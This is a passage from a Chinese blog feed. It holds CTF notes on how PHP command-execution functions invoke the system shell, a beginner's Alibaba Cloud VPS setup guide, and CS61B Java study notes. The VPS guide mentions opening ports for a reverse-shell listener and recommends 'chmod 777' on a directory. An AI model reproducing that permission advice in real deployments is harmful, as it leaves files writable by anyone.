Command</span><br></pre></td></tr></table></figure><h2 id="Dive-into-PHP"><a href="#Dive-into-PHP" class="headerlink" title="Dive into PHP"></a>Dive into PHP</h2><blockquote><p>重点关注: system, exec, shell_exec, passthru 四个函数</p></blockquote><ol><li><p>这一部分就详见qftm的文章吧，写的很好，我来小小<em><strong>总结</strong></em></p><ol><li><p>linux中system、exec、passthru、shell_exec这类命令执行函数底层在linux中都是调用<code>/bin/sh -c &#39;...&#39;</code>这样的，是通过源码看出来的 –&gt; 这里的&#x2F;bin&#x2F;sh在不同平台中所指向的链接不同，debian系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;dash；redhat系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;bash</p><blockquote><p>最初，bash是GNU&#x2F;Linux 操作系统中 &#x2F;bin&#x2F;sh 的符号链接，但由于bash过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash，且&#x2F;bin&#x2F;sh符号连接到dash。Dash Shell 比 Bash Shell 小的多（ubuntu16.04上，bash大概1M，dash只有150K），符合POSIX标准。Ubuntu 6.10开始默认是Dash。</p></blockquote></li><li><p>windows中都是cmd.exe</p></li><li><p><em><strong>QUICK判断</strong></em>: 如果单纯的是想知道某个命令执行函数是否调用cmd.exe终端去执行系统指令的话，可以在php脚本里面写一个循环，然后观察进程创建情况即可：简单、粗暴</p></li></ol></li><li><p>关于exec()</p><ol><li>在官方手册的评论中有这样一句话，很是受益，平时找的时候可以关注一下评论<a href="https://www.php.net/function.exec">111</a></li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In Windows, <span class="built_in">exec</span>() issues an internal call to <span class="string">&quot;cmd /c your_command&quot;</span>. This implies that your <span class="built_in">command</span> must follow the rules imposed by cmd.exe <span class="built_in">which</span> includes an extra <span class="built_in">set</span> of quotes around the full <span class="built_in">command</span>:</span><br><span class="line"></span><br><span class="line">- http://ss64.com/nt/cmd.html</span><br><span class="line"></span><br><span class="line">Current PHP versions take this into account and add the quotes automatically, but old versions didn<span class="string">&#x27;t.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apparently, the change was made in PHP/5.3.0 yet not backported to 5.2.x because it&#x27;</span>s a backwards incompatible change. To <span class="built_in">sum</span> up:</span><br><span class="line"></span><br><span class="line">- In PHP/5.2 and older you have to surround the full <span class="built_in">command</span> plus arguments <span class="keyword">in</span> double quotes</span><br><span class="line">- In PHP/5.3 and greater you don<span class="string">&#x27;t have to (if you do, your script will break)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you are interested in the internals, this is the source code:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sprintf(cmd, &quot;%s /c \&quot;%s\&quot;&quot;, TWG(comspec), command); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It can be found at http://svn.php.net/viewvc/ (please find php/php-src/trunk/TSRM/tsrm_win32.c, the comment system doesn&#x27;</span>t allow the direct <span class="built_in">link</span>).</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf3r的第一台vps</title>
      <link href="/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/"/>
      <url>/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/</url>
      
        <content type="html"><![CDATA[<blockquote><p>给曾经一窍不通的自己的总结，其实看官方文档就ok了，这一篇做一个记录，后面忘记了也可以quick start</p></blockquote><h2 id="1-购买服务器"><a href="#1-购买服务器" class="headerlink" title="1. 购买服务器"></a>1. 购买服务器</h2><ol><li>建议<ol><li>看看优惠页面，直接搜索即可</li><li>看看试用</li><li>如果是学生的话搜索时添加个学生就够了</li><li>入门的话感觉瞄准阿里云(免费额度也够)就好了，不用太在不同平台间挣扎浪费时间</li></ol></li><li>我现在暂时用的是阿里云的服务器试用，美味的白嫖<ol><li>注意自己注意时间，给的是要3个月内使用的300元体验</li><li>一个月检查一次吧</li></ol></li></ol><h2 id="2-配置与vscode"><a href="#2-配置与vscode" class="headerlink" title="2. 配置与vscode"></a>2. 配置与vscode</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/getting-started/getting-started?spm=a2c4g.11186623.0.0.4802629cDcbhgp">看看官方入门文档</a></li><li>Quick Start<ol><li>购买服务器<ol><li>流量先切换为固定，0流量</li><li>直接开机</li><li>开机后修改为按流量付费，数值为100</li></ol></li><li>安全组设置，快速添加+手动<ol><li>手动我是起的reShell和docker服务</li></ol></li><li>设置用户<ol><li>如果是root用户登录且没有ecs-xxx的情形<ol><li>S1: <code>useradd ecs-xxx</code></li><li>S2(可跳过): <code>usermod -aG ecs-users ecs-xxx</code></li><li>S3: <code>usermod -aG wheel ecs-xxx</code>，添加到sudo中</li><li>S4: <code>su ecs-xxx</code></li></ol></li><li>有一些没有可以选择root或者ecs-user的机型可能会有出现无法登录root的情况 –&gt; <a href="https://help.aliyun.com/zh/ecs/use-cases/log-on-to-a-linux-instance-by-using-an-ssh-key-pair-as-a-regular-user">看看这篇</a></li></ol></li><li>设置密码登录(workbench)<ol><li><a href="https://help.aliyun.com/zh/ecs/user-guide/manage-remote-connection-users">官方文档见添加更多用户那里，这里不是重置初始用户(如果是root)</a></li></ol></li><li>设置ssh连接<ol><li><a href="https://help.aliyun.com/zh/ecs/user-guide/manage-remote-connection-users">官方文档见添加更多用户那里，这里不是重置初始用户(如果是root)</a></li><li>本地生成公钥密钥，把公钥放到远程vps</li></ol></li><li>设置不可以用密码登录root<ol><li>vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config，将PermitRootLogin设置为no<ol><li><a href="https://developer.aliyun.com/article/1024602">参考文章</a></li></ol></li></ol></li><li>开启php的docker服务</li></ol></li><li>vscode个人配置<ol><li>连接配置<ol><li>在windows中连接；wsl无法再连向远程了，cs144可以是因为再容器中；需要再windows中设置</li></ol></li><li>文件传输配置: ftp<ol><li>local-&gt;remote，无法remote-&gt;local, 否则我就不用来开vps了</li><li>在windows中使用的，可以直接cv</li><li>也可以考虑wsl文件先放到Win中，然后win中在终端传到云服务器上<ol><li>wsl与windows针对云通用的文件夹: <code>YUN</code>，可以设置别名(toYUN)<ol><li>wsl中设置环境变量<code>YUN</code>方便将文件传入到windows中<code>cp my_file $YUN</code>，windows中可以直接使用<code>toYUN</code>别名切换到$YUN文件夹中来传文件(我用到bash)</li></ol></li><li>在ww2yun文件夹开启sftp服务：<code>sftp</code>(<strong>文件相对路径默认传输到<code>/home/user/</code>文件夹下</strong>)<ol><li>可以使用<code>ls</code>, <code>cd</code>, <code>pwd</code>, <code>rm</code>, <code>mkdir</code>, <code>rmdir</code>来管理</li><li><code>get -r remote_file remote_dir</code></li><li><code>put -r local_file remote_dir</code></li><li>使用<code>bye</code>或者<code>exit</code>退出</li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="3-部署服务"><a href="#3-部署服务" class="headerlink" title="3. 部署服务"></a>3. 部署服务</h2><h3 id="nodejs-手动直接部署ok"><a href="#nodejs-手动直接部署ok" class="headerlink" title="nodejs: 手动直接部署ok"></a>nodejs: 手动直接部署ok</h3><blockquote><p>原因就是易上手</p></blockquote><ol><li><a href="https://help.aliyun.com/zh/ecs/use-cases/summary-of-website-building-methods?spm=a2c4g.11186623.0.0.66c840f10Z91oO#p-43l-u9m-c5v">阿里云教程</a></li><li>搭建node.js环境，有教程，直接看就好</li><li>搞一个路由文件就OK了，方便进行文件包含和访问</li></ol><h3 id="lnmp-phpstudy"><a href="#lnmp-phpstudy" class="headerlink" title="lnmp: phpstudy"></a>lnmp: phpstudy</h3><ol><li>ref[<a href="https://old.xp.cn/phpstudy-linux/install.html]%EF%BC%8C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4%E4%B8%BA%60xp%60%EF%BC%8C%60xp%60%E5%BC%80%E5%90%AF%E9%9D%A2%E6%9D%BF%E5%90%8E%E7%99%BB%E5%BD%95%E9%9D%A2%E6%9D%BF%60%E5%85%AC%E7%BD%91ip:port%60%E5%B0%B1%E5%A5%BD%E4%BA%86">https://old.xp.cn/phpstudy-linux/install.html]，命令行工具命令为`xp`，`xp`开启面板后登录面板`公网ip:port`就好了</a></li><li><strong>S1: 下载</strong>；官方网址有linux命令一键下载的</li><li><strong>S2: 一键部署</strong>；然后访问后台admin，在网站页面(应该是)有一键部署lnmp环境，点击一下下载即可</li><li><strong>S3: vscode权限问题处理</strong>；对想要修改权限的文件夹修改拥有者，比如这里要改<code>www/$USER</code>的话就<code>sudo chown -hR $USER:$USER www/$USER</code></li></ol><h3 id="php-推荐-docker"><a href="#php-推荐-docker" class="headerlink" title="php(推荐): docker"></a>php(推荐): docker</h3><blockquote><p>不会像phpstudy一样有什么限制这样</p></blockquote><ol><li>官方文档[<a href="https://help.aliyun.com/zh/ecs/use-cases/install-and-use-docker-on-a-linux-ecs-instance]">https://help.aliyun.com/zh/ecs/use-cases/install-and-use-docker-on-a-linux-ecs-instance]</a></li><li>照着上面一步一步做就好了，php部署见《搭建本地linux下的php环境》这篇blog</li></ol><h2 id="4-域名设置"><a href="#4-域名设置" class="headerlink" title="4. 域名设置"></a>4. 域名设置</h2><blockquote><p>用来ctf的vps的话更重要但是短域名吧</p></blockquote><ol><li>我搞的是github学生包里的namecheap中的免费一年的.me域名，折腾一下就好了</li><li><a href="https://zhuanlan.zhihu.com/p/634806678">参考文章链接</a><ol><li>注意要从github活动页进去才可以</li></ol></li><li>最后在wsl(我的话)使用<code>nslookup</code>来查询域名即可</li></ol><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="SV-阿里云Docker的php服务无法访问？"><a href="#SV-阿里云Docker的php服务无法访问？" class="headerlink" title="SV | 阿里云Docker的php服务无法访问？"></a>SV | 阿里云Docker的php服务无法访问？</h3><blockquote><p>灵活搜索：阿里云云容器无法访问，阿里云docker php无法访问<br>找关键词：err_unsafe_port</p></blockquote><ol><li>可以看到返回显示err_unsafe_port，不能在危险端口，这里是6666遇到了，换一个端口就好了</li><li>其他的尝试<ol><li>iptables[<a href="https://blog.csdn.net/qq_42108331/article/details/136310857]">https://blog.csdn.net/qq_42108331/article/details/136310857]</a></li><li>firewall-cmd[<a href="https://developer.aliyun.com/ask/550019]">https://developer.aliyun.com/ask/550019]</a></li><li>网段设置[<a href="https://blog.csdn.net/weixin_43224937/article/details/121077310]">https://blog.csdn.net/weixin_43224937/article/details/121077310]</a></li></ol></li></ol><h3 id="SV-bt部署php服务面板无法访问？"><a href="#SV-bt部署php服务面板无法访问？" class="headerlink" title="SV | bt部署php服务面板无法访问？"></a>SV | bt部署php服务面板无法访问？</h3><ol><li>和阿里云的docker一样的问题，危险端口，换成不是危险的端口就ok了</li></ol><h3 id="SV-阿里云Docker的php服务写入文件"><a href="#SV-阿里云Docker的php服务写入文件" class="headerlink" title="SV | 阿里云Docker的php服务写入文件"></a>SV | 阿里云Docker的php服务写入文件</h3><ol><li><strong>解决方案一</strong><ol><li>是直接使用相对路径，不要使用<code>__DIR__</code>，直接<code>$logFile=&#39;request.log</code>这样就好</li><li>但是后来使用<code>__DIR__</code>突然就好了，有点奇怪，总之碰到可以试试 –&gt; 传来噩耗，文件名写错了sad，request.log写成requests.log了</li></ol></li><li><strong>解决方案二</strong><ol><li>将文件夹权限改为<code>sudo chmod 777 dir</code>，就可以写入了</li></ol></li><li>和下面这个是无关的，ro或者rw都可以<ol><li><code>docker run  --name nginx-php -p 8083:80 -d -v  ~/Docker/nginx/www:/usr/share/nginx/html:ro -v ~/Docker/nginx/conf/conf.d/:/etc/nginx/conf.d:ro --link php7.3-fpm:php nginx</code>，在本地8083端口访问<code>http://localhost:8083/</code></li><li>其中ro是以只读 (:ro) 模式挂载了 ~&#x2F;Docker&#x2F;nginx&#x2F;www 目录。这意味着即使权限正确且 SELinux 允许，PHP 仍然无法在这个目录中创建新文件</li><li>需要写入可以使用:rw模式挂载他</li></ol></li></ol><h3 id="SV-阿里云php-S-0-0-0-0-port开启服务无法访问"><a href="#SV-阿里云php-S-0-0-0-0-port开启服务无法访问" class="headerlink" title="SV | 阿里云php -S 0.0.0.0:port开启服务无法访问"></a>SV | 阿里云php -S 0.0.0.0:port开启服务无法访问</h3><ol><li>是在不行将文件名改为index.php试试，一般是可以，注意防火墙</li></ol>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CS61B小结21</title>
      <link href="/2024/09/15/CS61B%E5%B0%8F%E7%BB%9321/"/>
      <url>/2024/09/15/CS61B%E5%B0%8F%E7%BB%9321/</url>
      
        <content type="html"><![CDATA[<blockquote><p>后面考试时再过一遍印象就深了</p></blockquote><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><ul><li><a href="#index">Index</a></li><li><a href="#resources">Resources</a></li><li><a href="#qa">Q&amp;A</a></li><li><a href="#principle-of-datastruct">Principle of DataStruct</a></li><li><a href="#0-extension">0. Extension</a><ul><li><a href="#0-1-javadoc">0. 1. Javadoc</a></li><li><a href="#0-2-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9D%A1%E4%BB%B6">0. 2 垃圾回收条件</a></li><li><a href="#0-3-hof-afterinclude-java-8">0. 3 HOF after&#x2F;include java 8</a></li><li><a href="#0-4-callback-function-in-java%E6%90%9Csubtype-polymorphism-vs-hofs">0. 4 CallBack Function in Java(搜Subtype Polymorphism vs. HoFs)</a></li><li><a href="#0-5-nested-class%E4%B8%8Einterface%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%BA%A7%E5%88%AB">0. 5 Nested Class与Interface的访问控制级别</a></li><li><a href="#0-6-how-to-deal-with-exceptions">0. 6 How to deal with Exceptions</a></li><li><a href="#0-7-setofe%E6%96%B9%E6%B3%95%E7%94%A8%E4%BA%8E%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%88%9D%E5%A7%8B%E5%8C%96">0. 7 Set.of(E…)方法用于可以<strong>直接</strong>进行初始化</a></li></ul></li><li><a href="#1-basic-classes-and-testing">1. Basic Classes and Testing</a><ul><li><a href="#1-1-defining-and-using-classes">1. 1 Defining and Using Classes</a></li><li><a href="#1-2-testing">1. 2 Testing</a></li></ul></li><li><a href="#2-listsintroduction">2. Lists(Introduction)</a><ul><li><a href="#2-1-referencesrecursionand-lists">2. 1 References,Recursion,and Lists</a></li><li><a href="#2-2-sllists-nested-classes-sentinel-nodes">2. 2 SLLists, Nested Classes, Sentinel Nodes</a></li><li><a href="#2-3-dllists-arrays">2. 3 DLLists, Arrays</a></li><li><a href="#2-4-alists-resizing">2. 4 ALists, Resizing</a></li></ul></li><li><a href="#3-futher-java-feature">3. Futher Java Feature</a><ul><li><a href="#3-1-inheritance-implements">3. 1 Inheritance, Implements</a></li><li><a href="#3-2-extends-casting-higher-order-functions">3. 2 Extends, Casting, Higher Order Functions</a></li><li><a href="#3-3-subtype-polymorphism-vs-hofs">3. 3 Subtype Polymorphism vs. HoFs</a></li><li><a href="#3-4-java-packages-and-librarygitbook">3. 4 Java Packages and Library(gitbook)</a></li><li><a href="#3-5-exceptions-iterators-object-methods">3. 5 Exceptions, Iterators, Object Methods</a></li><li><a href="#3-6-jar-filegitbook">3. 6 JAR FILE(gitbook)</a></li><li><a href="#3-7-access-controlgitbook">3. 7 Access Control(gitbook)</a></li><li><a href="#3-8-generic-and-autoboxinggitbook">3. 8 Generic and AutoBoxing(gitbook)</a></li></ul></li><li><a href="#4-abstraction-adts-and-asymtotics-annlysis">4. Abstraction, ADTs and Asymtotics Annlysis</a><ul><li><a href="#4-1-ourmapgitbook">4. 1 OurMap(gitbook)</a></li><li><a href="#4-2-encapsulation-apis-adts">4. 2 Encapsulation, API’s, ADT’s</a></li><li><a href="#4-3-asymptotics-i-ii">4. 3 Asymptotics I II</a></li><li><a href="#4-4-omega-and-amortized-analysisgitbook">4. 4 Omega and Amortized Analysis(gitbook)</a></li><li><a href="#4-5-disjoint-sets%E4%B8%8D%E7%9B%B8%E4%BA%A4%E9%9B%86">4. 5 Disjoint Sets(不相交集)</a></li></ul></li><li><a href="#5-trees-and-hashing">5. Trees and Hashing</a><ul><li><a href="#5-1-binary-search-tree%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91">5. 1 Binary Search Tree(二叉搜索树)</a></li><li><a href="#5-2-b-tree-maybe-boeing-tree">5. 2 B-Tree (Maybe Boeing Tree)</a></li><li><a href="#5-3-black-red-tree-%E7%BA%A2%E9%BB%91%E6%A0%91">5. 3 Black-Red-Tree (红黑树)</a></li><li><a href="#5-4-hashing">5. 4 Hashing</a></li><li><a href="#5-5-heaps-and-pqs">5. 5 Heaps and PQs</a></li><li><a href="#5-6-data-structure-summary">5. 6 Data Structure Summary</a></li><li><a href="#5-7-compressionoriginally-38">5. 7 Compression(Originally 38)</a></li><li><a href="#5-8-compression-complexity-and-pnp">5. 8 Compression, Complexity, and P&#x3D;NP?</a></li></ul></li><li><a href="#6-graphs">6. Graphs</a><ul><li><a href="#6-1-tree-and-graph-traversals">6. 1 Tree and Graph Traversals</a></li><li><a href="#6-2-graph-traversals-and-implementationsbfs-and-dfs">6. 2 Graph Traversals and Implementations(BFS and DFS)</a></li><li><a href="#6-3-shortest-paths">6. 3 Shortest Paths</a></li><li><a href="#6-4-minimum-spanning-trees">6. 4 Minimum Spanning Trees</a></li><li><a href="#6-5-range-searching-and-multi-dimensional-data">6. 5 Range Searching and Multi-Dimensional Data</a></li><li><a href="#6-6-prefix-operations-and-tries">6. 6 Prefix Operations and Tries</a></li><li><a href="#6-7-dags-reduction-decomposition">6. 7 DAGs, Reduction, Decomposition</a></li></ul></li><li><a href="#7-sorting">7. Sorting</a><ul><li><a href="#7-1-basic-sorts">7. 1 Basic Sorts</a></li><li><a href="#7-2-quick-sorts">7. 2 Quick Sorts</a></li><li><a href="#7-3--more-quick-sort-comparision-based-sorting-summary">7. 3  More Quick Sort, (Comparision Based) Sorting Summary</a></li><li><a href="#7-4-sorting-and-algorithmic-bounds">7. 4 Sorting and Algorithmic Bounds</a></li><li><a href="#7-5-radix-sorts">7. 5 Radix Sorts</a></li><li><a href="#7-6-sorting-and-data-structures-conclusion">7. 6 Sorting and Data Structures Conclusion</a></li><li><a href="#7-7-sorting-implementation-extra-in-sorting-and-algorithmic-bounds-ppt">7. 7 Sorting Implementation (Extra in “Sorting and Algorithmic Bounds” ppt)</a></li></ul></li><li><a href="#8-extra-topic-software-engineering">8. Extra Topic: SoftWare Engineering</a><ul><li><a href="#8-1-se-i-complexity">8. 1 SE I: Complexity</a></li><li><a href="#8-2-se-ii-modular">8. 2 SE II: Modular</a></li></ul></li></ul><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://joshhug.gitbooks.io/hug61b/content/">cs61b gitbook</a></li></ol><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><ol><li>is there any simpler way to prove amortization in 4.4?</li><li>didn’t cover AVL tree, jush says the llrb is the best or good(simple and clear) enough(mit 6.006 has AVL tree)</li><li>红黑树笔记还没记下来，k-d tree也还没有</li><li>未实现:AVL tree, Bellman-Ford(对于负权重)</li><li>Bst实现Trie如何实现，想不出来a, b, c, d怎么可以有序</li><li>后续匹配，6.6最后的other部分</li><li>为什么不是DAGs没办法找出topological sort</li><li>Shortest paht in DAGs中没有将bellman-ford</li><li>quick sort为什么hate要&#x3D;&#x3D;</li></ol><h2 id="Principle-of-DataStruct"><a href="#Principle-of-DataStruct" class="headerlink" title="Principle of DataStruct"></a>Principle of DataStruct</h2><ol><li>并不是要某一个操作一定要少，这是一门设计N-&gt;1的结构课程(目的是防止N-&gt;infinity时数据的结构)<ol><li>在B-Tree处体现得最好</li></ol></li><li>思维<ol><li>dijkstra:无法一下子从全局切入就回到这一步进行切入</li><li>tries:减少重复</li></ol></li></ol><h2 id="0-Extension"><a href="#0-Extension" class="headerlink" title="0. Extension"></a>0. Extension</h2><h3 id="0-1-Javadoc"><a href="#0-1-Javadoc" class="headerlink" title="0. 1. Javadoc"></a>0. 1. Javadoc</h3><ol><li>以<code>/** ... */</code>为格式，为类、接口、方法、构造函数以及变量编写文档，作为api文档</li><li>常用注释标记<ol><li>@param</li><li>@return</li><li>@throws 可能抛出的异常</li><li>@deprecated 是否仍然推荐</li><li>@author</li></ol></li></ol><h3 id="0-2-垃圾回收条件"><a href="#0-2-垃圾回收条件" class="headerlink" title="0. 2 垃圾回收条件"></a>0. 2 垃圾回收条件</h3><ol><li>引用断裂</li><li>不可达</li></ol><h3 id="0-3-HOF-after-include-java-8"><a href="#0-3-HOF-after-include-java-8" class="headerlink" title="0. 3 HOF after&#x2F;include java 8"></a>0. 3 HOF after&#x2F;include java 8</h3><ol><li>Java 8开始引入了Lambda表达式和函数式接口，也可以创建自己的函数式工具</li><li>去问chatgpt</li></ol><h3 id="0-4-CallBack-Function-in-Java-搜Subtype-Polymorphism-vs-HoFs"><a href="#0-4-CallBack-Function-in-Java-搜Subtype-Polymorphism-vs-HoFs" class="headerlink" title="0. 4 CallBack Function in Java(搜Subtype Polymorphism vs. HoFs)"></a>0. 4 CallBack Function in Java(搜Subtype Polymorphism vs. HoFs)</h3><ol><li>实现机制:过接口或抽象类实现，允许程序将一个方法作为参数传递给另一个方法，或者在某个事件或条件发生时触发一个方法的执行</li><li>涉及内容:接口、匿名类、lambda、函数式接口、事件监听器、回调机制</li></ol><h3 id="0-5-Nested-Class与Interface的访问控制级别"><a href="#0-5-Nested-Class与Interface的访问控制级别" class="headerlink" title="0. 5 Nested Class与Interface的访问控制级别"></a>0. 5 Nested Class与Interface的访问控制级别</h3><ol><li>补充一下默认访问级别——有指定访问修饰符，它具有默认访问级别。这意味着接口只能被同一个包中的其他类访问，不能被不同包中的类访问</li></ol><h3 id="0-6-How-to-deal-with-Exceptions"><a href="#0-6-How-to-deal-with-Exceptions" class="headerlink" title="0. 6 How to deal with Exceptions"></a>0. 6 How to deal with Exceptions</h3><ol><li><p>异常类型</p><ol><li>检查型异常（Checked Exceptions）：这些是编译时检查的异常</li><li>非检查型异常（Unchecked Exceptions）：这些是编译时不检查的异常</li><li>错误error：通常是由于系统资源限制或编程中的严重问题导致的，它们不属于 Exception 类的子类</li></ol></li><li><p>抛出异常</p><ol><li>throw：手动抛出异常</li><li>throws：在方法声明中指定该方法可能抛出的异常<code>public void readFile(String filePath) throws IOException &#123; ... &#125;</code>当方法内部抛出指定类型的异常时，该异常会被传递给调用该方法的代码，并在该代码中处理异常——try-catch<ol><li>告知外部代码此处有可能有异常，需要进行处理</li></ol></li></ol></li><li><p>try-catch</p><ol><li>可以有多重</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="comment">// code that would go wrong ...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">   <span class="comment">// code to deal with the exceptions ...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException f) &#123;</span><br><span class="line">   <span class="comment">// code to deal with ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>try-with-resources</p></li></ol><h3 id="0-7-Set-of-E…-方法用于可以直接进行初始化"><a href="#0-7-Set-of-E…-方法用于可以直接进行初始化" class="headerlink" title="0. 7 Set.of(E…)方法用于可以直接进行初始化"></a>0. 7 Set.of(E…)方法用于可以<strong>直接</strong>进行初始化</h3><ol><li><p>HashSet的构造函数不可以直接传入内容，比较麻烦，Set.of方法返回则不可修改，也可以用于自定义的Set等</p></li><li><p>of function：静态、泛型</p><ol><li>可变量参数会被自动打包到数组中</li><li><code>public static ArraySet&lt;T&gt; of(T... stuff)</code>不可行——T 被视为类级别的类型参数。然而，在静态方法中，类级别的类型参数是不可访问的，因为静态方法属于类，而不是类的实例。因此，编译器无法识别 T 是什么类型，从而导致编译错误</li><li>&lt;T&gt; 放在返回类型之前，表明这个方法是泛型方法，可以处理任意类型 T。这个声明告诉Java编译器，T 是这个方法的类型参数。它允许方法根据传入的参数确定类型 T</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; ArraySet&lt;T&gt; <span class="title function_">of</span><span class="params">(T... stuff)</span> &#123;</span><br><span class="line">   <span class="comment">/** 使用了可变量参数 */</span></span><br><span class="line">   ArraySet&lt;T&gt; returnSet = <span class="keyword">new</span> <span class="title class_">ArraySet</span>&lt;&gt;();</span><br><span class="line">   <span class="keyword">for</span> (T t: stuff) &#123;</span><br><span class="line">      returnSet.add(t);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> returnSet;</span><br><span class="line">&#125;     </span><br></pre></td></tr></table></figure></li></ol><h2 id="1-Basic-Classes-and-Testing"><a href="#1-Basic-Classes-and-Testing" class="headerlink" title="1. Basic Classes and Testing"></a>1. Basic Classes and Testing</h2><h3 id="1-1-Defining-and-Using-Classes"><a href="#1-1-Defining-and-Using-Classes" class="headerlink" title="1. 1 Defining and Using Classes"></a>1. 1 Defining and Using Classes</h3><ol><li>using helper functions, eaiser to debug and so on</li><li>static and nonstatic</li></ol><h3 id="1-2-Testing"><a href="#1-2-Testing" class="headerlink" title="1. 2 Testing"></a>1. 2 Testing</h3><ol><li><p>Tools:使用junit进行测试</p></li><li><p><strong>Running:运行测试</strong></p><ol><li><p>一可以在main中运行</p></li><li><p>二可以使用@org.junit.Test，方法需要为non-static，使用@Test</p><ol><li>使用”test annotation”来便于测试</li><li>使用import进行省略，后续会拓展</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.*;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test; </span><br><span class="line">   <span class="comment">// 使用这个之后就可以使用@Test来使用junit运行测试而不是main了</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>Test Driven Development(TDD)，先编写Test再完成它而不是先完成再编写Test</p></li><li><p>unit test and intergration test</p></li></ol><h2 id="2-Lists-Introduction"><a href="#2-Lists-Introduction" class="headerlink" title="2. Lists(Introduction)"></a>2. Lists(Introduction)</h2><h3 id="2-1-References-Recursion-and-Lists"><a href="#2-1-References-Recursion-and-Lists" class="headerlink" title="2. 1 References,Recursion,and Lists"></a>2. 1 References,Recursion,and Lists</h3><ol><li>references引用<ol><li>java中的普通类型在内存中存储为变量的”value”，java中的数组是对象</li><li>java中的引用都是复制，只是地址还是内容而已，<strong>一个对象存储的是存储的地址</strong></li><li>java中的引用(无论什么object都是8bytes)存储了对某个对象的引用(内存地址)，强调”object”(与cpp不同)<ol><li><code>Obj _obj = new Obj();</code>中_obj存储地址指向<code>new Obj()</code>开辟的内存空间</li><li>java中的&#x3D;都是复制，但是<code>Obj _obj2 = _obj</code>时复制的是地址，表现就是指向同一个地址</li></ol></li></ol></li><li>Lists即为链表，java实现，并使用递归和迭代版本实现<ol><li>java中的链表可以在内部使用本对象进行指向，这是因为java中的reference</li></ol></li></ol><h3 id="2-2-SLLists-Nested-Classes-Sentinel-Nodes"><a href="#2-2-SLLists-Nested-Classes-Sentinel-Nodes" class="headerlink" title="2. 2 SLLists, Nested Classes, Sentinel Nodes"></a>2. 2 SLLists, Nested Classes, Sentinel Nodes</h3><ol><li>SLLists<ol><li>一:IntList是裸递归，没有优化，二:IntList没有对成员进行访问控制，三:可以隐藏null的细节</li><li>使用SLList作为用户与node的中间人，进行抽象进行组织</li></ol></li><li><strong>Nested Classes(嵌套类)</strong><ol><li>Java 为我们提供了将类声明嵌入到另一个类声明中的能力，嵌套类对代码性能没有有意义的影响</li><li>静态嵌套类(Static Nested Class)<ol><li>法则：如果不使用外部类的任何实例成员，请使嵌套类成为静态类</li><li>静态嵌套类是定义在另一个类中，并且使用 static 关键字声明的类，与成员内部类不同，静态嵌套类不能直接访问外部类的非静态成员它们可以看作是外部类的一个独立组件，通常用于工具类或辅助类</li><li>可以独立于外部类的实例而使用，可以独立创建实例</li></ol></li></ol></li><li><strong>Container设计原则</strong><ol><li>隐藏细节(helper使用private，static类)，接口函数的具体helper实现使用private进行隐藏</li><li>使用caching避免不必要的开销</li></ol></li><li>Sentinel Node(哨兵节点)<ol><li>起源：使用空链表问题，再次进行addList</li><li>为特殊节点进行特殊考虑的方法<ol><li>使用if 